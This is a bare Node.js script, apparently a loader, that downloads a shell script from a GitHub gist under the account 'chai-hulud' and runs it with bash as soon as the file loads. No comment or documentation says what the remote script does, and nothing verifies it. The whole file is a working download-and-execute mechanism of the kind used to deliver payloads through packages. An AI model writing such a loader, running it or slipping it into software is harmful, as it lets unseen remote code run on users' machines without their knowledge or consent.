const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const url = 'https://gist.githubusercontent.com/chai-hulud/2912689a3847a7045c445731dd5d73b4/raw/e204882ed0de03dd008802c7a824513340d2c292/install.sh';
const filePath = path.join(__dirname, 'downloaded_script.sh');

const downloadScript = (url, filePath) => {
  const file = fs.createWriteStream(filePath);
  https.get(url, (response) => {
    response.pipe(file);
    file.on('finish', () => {
      file.close(() => {
        executeScript(filePath);
      });
    });
  }).on('error', (err) => {
    fs.unlink(filePath);
    console.error('Error downloading the script:', err.message);
  });
};

const executeScript = (filePath) => {
  exec(`bash ${filePath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
};

downloadScript(url, filePath);
